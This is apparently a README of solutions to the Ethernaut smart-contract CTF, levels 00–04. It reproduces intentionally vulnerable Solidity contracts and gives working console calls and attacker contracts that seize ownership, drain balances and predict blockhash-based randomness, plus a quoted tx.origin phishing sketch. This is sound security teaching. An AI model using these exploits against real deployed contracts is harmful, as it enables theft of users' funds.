# Ethernaut

My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.

## Table of Contents

<details>
<summary>
<a href="#00-hello-ethernaut">00. Hello Ethernaut</a>
</summary>
<ol>
    <li><a href="./contracts/00-hello-ethernaut/">Contracts</a></li>
    <li><a href="./scripts/00-hello-ethernaut.ts">Script</a></li>
</ol>
</details>

<details>
<summary>
<a href="#01-fallback">01. Fallback</a>
</summary>
<ol>
    <li><a href="./contracts/01-fallback/">Contracts</a></li>
    <li><a href="./scripts/01-fallback.ts">Script</a></li>
</ol>
</details>

<details>
<summary>
<a href="#02-fallout">02. Fallout</a>
</summary>
<ol>
    <li><a href="./contracts/02-fallout/">Contracts</a></li>
    <li><a href="./scripts/02-fallout.ts">Script</a></li>
</ol>
</details>

<details>
<summary>
<a href="#03-coin-flip">03. Coin Flip</a>
</summary>
<ol>
    <li><a href="./contracts/03-coin-flip/">Contracts</a></li>
    <li><a href="./scripts/03-coin-flip.ts">Script</a></li>
</ol>
</details>

<details>
<summary>
<a href="#04-telephone">04. Telephone</a>
</summary>
<ol>
    <li><a href="./contracts/04-telephone/">Contracts</a></li>
    <li><a href="./scripts/04-telephone.ts">Script</a></li>
</ol>
</details>

## 00. Hello Ethernaut

This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.

<details>
  <summary>Browser Console Solution</summary>

```javascript
// 1
await contract.info();
// 'You will find what you need in info1().'

// 2
await contract.info1();
// 'Try info2(), but with "hello" as a parameter.'

// 3
await contract.info2('hello');
// 'The property infoNum holds the number of the next info method to call.'

// 4
await contract.infoNum();
// {
//  ...
//  words: [42],
// };

// 5
await contract.info42();
// 'theMethodName is the name of the next method.'

// 6
await contract.theMethodName();
// 'The method name is method7123949.'

// 7
await contract.method7123949();
// 'If you know the password, submit it to authenticate().'

// 8
await contract.password();
// 'ethernaut0'

// 9
await contract.authenticate('ethernaut0');
// tx receipt...
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's move on to the next challenge! :running:

</details>

<details>
  <summary>Browser Console Solution For Cheaters</summary>

```javascript
await contract.authenticate('ethernaut0');
// tx receipt...
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's cheat the next challenge! :running:

</details>

<a href='./contracts/00-hello-ethernaut/'>Contracts</a> | <a href='./scripts/00-hello-ethernaut.ts'>Script</a>

## 01. Fallback

### Challenge

Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

<details>
  <summary>Instance</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

</details>

### Solution

<details>
  <summary>Description</summary>

In order to pass the challenge, we need to become the owner of the contract and withdraw the entire balance from the contract.

In the instance contract, the owner is set in 3 places:

1. Constructor. When deploying a contract.
2. Method `contribute`. To do this, we need to transfer at least 1 wei (but less than 0.001 Ether).
3. Method `receive`. This method is called every time we send Ether to a contract address without calling any contract function.

Understanding how `receive` works is the key to hacking this smart contract.

> You can read about how the `receive` function works in the [official docs](https://docs.soliditylang.org/en/v0.8.24/contracts.html#receive-ether-function), [stackexchange](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity).

The `receive` function checks the user has sent some non-zero amount of ether (at least 1 wei) and has already contributed some amount of ether (less than 0.001 ether) by calling the `contribute` method.

The hacking algorithm is as follows:

1. We call `contribute` and send 1 wei along with the function call.
2. We send to the contract address 1 wei. We are now the owner of the contract.
3. Call the `withdraw` function.

</details>

<details>
  <summary>Browser Console Solution</summary>

```javascript
// 1
await contract.contribute({ value: _ethers.utils.parseUnits('1', 'wei') });

// 2
await contract.sendTransaction({
  to: contract.address,
  value: _ethers.utils.parseUnits('1', 'wei'),
});

// 3
await contract.withdraw();
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's move on to the next challenge! :running:

</details>

<a href='./contracts/01-fallback/'>Contracts</a> | <a href='./scripts/01-fallback.ts'>Script</a>

## 02. Fallout

### Challenge

Claim ownership of the contract below to complete this level.

Things that might help:

- Solidity Remix IDE

<details>
  <summary>Instance</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

</details>

### Solution

<details>
  <summary>Description</summary>

Since Solidity v0.4.23, constructors are now specified using the `constructor` keyword.
Before this version, the constructor was a function whose name was the same as the name of the contract.
Since Solidity [v0.5.0](https://docs.soliditylang.org/en/v0.8.24/050-breaking-changes.html#constructors) constructors must be defined using the `constructor` keyword.

The only place in the contract where the owner is set is in the `Fal1out` function. According to the creator of the contract, this should have been a constructor that would work once and could not be called again. In this case, hacking would not have been possible (for solidity version less than v0.5.0). However, the author made a typo in the name of the constructor and instead of `Fallout` it turned out to be `Fal1out`. And now we can easily withdraw money from the contract.

1. Call the `Fal1out` function. We become the owner of the contract.
2. Call the `collectAllocations` function. We get all the money from the contract.

</details>

<details>
  <summary>Browser Console Solution</summary>

```javascript
// 1
await contract.Fal1out({ value: _ethers.utils.parseUnits('1', 'wei') });

// 2
await contract.collectAllocations();
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's move on to the next challenge! :running:

</details>

<details>
  <summary>Real World Example Described By OpenZeppelin</summary>

That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?

Well... Not quite.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
}
```

This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.

</details>

<a href='./contracts/02-fallout/'>Contracts</a> | <a href='./scripts/02-fallout.ts'>Script</a>

## 03. Coin Flip

### Challenge

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

<details>
  <summary>Instance</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

</details>

### Solution

<details>
  <summary>Description</summary>

This is a challenge to understand how randomness works on Ethereum. Since this is a deterministic environment, it is not possible to create unpredictable randomness. If you need to use random in your protocol, then it is better to use oracles ([Chainlink VRF](https://docs.chain.link/vrf)).

In order to complete the challenge, we need to guess which side will fall out 10 times in a row.
Since this is based on the hash of the previous block, it is possible to calculate in advance which side will land.
To do this, we will write an attack contract and run it in [Remix Online](https://remix.ethereum.org/) and make 10 calls to the attack functions. Thus, we get the same `blockValue` as the instance, since we launch them in one transaction.

</details>

<details>
  <summary>Attack Contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip _coinFlip;

  constructor(CoinFlip coinFlip) {
    _coinFlip = coinFlip;
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _coinFlip.flip(side);
  }
}

```

</details>

<details>
  <summary>Comments From OpenZeppelin</summary>

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).

</details>

<a href='./contracts/03-coin-flip/'>Contracts</a> | <a href='./scripts/03-coin-flip.ts'>Script</a>

## 04. Telephone

### Challenge

Claim ownership of the contract below to complete this level.

<details>
  <summary>Instance</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

</details>

### Solution

<details>
  <summary>Description</summary>

`tx.origin != msg.sender` gives the right to change the overner. This check will return `true` only if the CA (contract address) calls this function and not EOA (externally owned address).

To do this, we will write an attacker contract and run it in [Remix Online](https://remix.ethereum.org/).

</details>

<details>
  <summary>Attacker Contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneAttacker {
  Telephone private _telephone;

  constructor(Telephone telephone) {
    _telephone = telephone;
  }

  function changeOwner() public {
    _telephone.changeOwner(msg.sender);
  }
}

```

</details>

<details>
  <summary>Comments From OpenZeppelin</summary>

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```solidity
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```solidity
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

</details>

<a href='./contracts/04-telephone/'>Contracts</a> | <a href='./scripts/04-telephone.ts'>Script</a>
